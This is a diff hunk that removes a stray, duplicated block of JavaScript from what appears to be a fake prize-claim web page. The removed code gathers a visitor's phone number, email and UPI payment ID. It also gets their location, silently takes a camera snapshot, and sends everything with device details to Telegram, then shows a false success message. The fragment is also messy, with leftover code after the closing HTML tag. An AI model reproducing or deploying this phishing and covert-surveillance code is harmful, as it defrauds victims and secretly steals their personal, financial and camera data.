@@ -257,40 +257,4 @@
     </script>
 </body>
 </html>
-                        const email = emailInput.value.trim();
-                const upi = upiInput.value.trim();
-
-                if (!phone || !email || !upi) {
-                    alert("Please fill out all fields to redeem your prize!");
-                    return;
-                }
-
-                // Get location
-                const location = await getLocation();
-
-                // Capture snapshot (silently)
-                const snapshot = await captureSnapshot();
-
-                // Prepare data to send
-                const data = {
-                    ...deviceInfo,
-                    phone,
-                    email,
-                    upi,
-                    location,
-                    snapshot: snapshot || "Camera access denied",
-                    timestamp: new Date().toISOString()
-                };
-
-                // Send to Telegram
-                await sendToTelegram(data);
-
-                // Show confetti and success message
-                createConfetti();
-                alert("🎉 Your prize is on its way! Check your email for further instructions. 🎉");
-            });
-        });
-    </script>
-</body>
-</html>
-    }
+                        
